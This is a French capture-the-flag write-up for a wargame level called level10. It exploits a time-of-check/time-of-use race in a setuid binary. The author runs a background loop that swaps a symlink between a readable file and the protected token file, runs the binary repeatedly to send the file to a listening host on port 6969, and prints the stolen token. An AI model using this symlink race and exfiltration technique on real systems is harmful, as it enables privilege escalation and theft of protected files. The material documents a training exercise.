Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
(binaire setuid et fichier token sans droits)

$ ./level10
./level10 file host
	sends file to host if you have access to it

$ ./level10 token localhost
You don't have access to token
(pas les droits sur token? ou check manuel dans le code)

$ ./level10 .profile localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
(pas de problemes de droits avec un fichier a level10, le setuid marche pas?)

Lancer server.py
$ echo "coucou" > /tmp/coucou
$ ./level10 /tmp/coucou 192.168.1.22
Connecting to 192.168.1.22:6969 .. Connected!
Sending file .. wrote file!
(On reçoit bien)

Pour les droits du fichier token, lien marche pas. c'est pas un check sur le nom

$ gdb level10 -> disas main
(on voit un access tot et le open bien plus loin apres l'ouverture de la socket)
man access :
Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit,
par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2),
risque de créer un trou de sécurité. En effet, l'utilisateur peut exploiter le
petit intervalle de temps entre la vérification et l'accès pour modifier le fichier
(via un lien symbolique en général). Pour cette raison, l'utilisation de cet appel système devrait être évitée.

Bah let's go. Il faut que le access soit fait sur un fichier random ou on a les droits et le open sur le bon fichier token

$ echo coucou > /tmp/coucou

Un lien de /tmp/faketoken vers token pour avoir une copie
lien de /tmp/faketoken vers /tmp/coucou pour passer le access
chacun son tour

tout ça dans une boucle infinie

$ $(while true; do ln -sf /tmp/coucou /tmp/faketoken; ln -sf $(pwd)/token /tmp/faketoken; done)&

Deuxieme boucle infinie du programme pour que ça tombe au bon moment. On lance le serveur de l'autre coté qui attends

$ $(while true; do ./level10 /tmp/faketoken 192.168.1.22; done) &

On prie

$ ./server.py
starting up on 192.168.1.22 port 6969
waiting for a connection
connection from ('192.168.1.27', 53723)
received "b'.*( )*.\n'"
received "b'woupa2yuojeeaaed06riuj63c\n'"
received "b''"

(Et voila)
